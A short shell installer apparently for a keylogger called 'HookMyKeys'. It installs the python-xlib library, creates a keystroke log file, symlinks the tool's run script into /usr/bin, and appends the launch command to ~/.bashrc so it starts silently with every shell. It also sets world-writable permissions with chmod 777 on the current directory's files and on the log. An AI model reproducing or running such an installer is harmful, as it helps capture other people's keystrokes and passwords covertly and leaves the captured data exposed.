sudo apt-get install python-xlib -y
chmod 777 *
mkdir ~/HookMyKeys
touch ~/HookMyKeys/HookMyKeys.log
chmod 777 ~/HookMyKeys/HookMyKeys.log
rm /usr/bin/hookmykeys
sudo ln -s ~/HookMyKeys/run.sh /usr/bin/hookmykeys
echo 'hookmykeys' >>~/.bashrc
echo "---------------------------SUCCESS---------------------------"
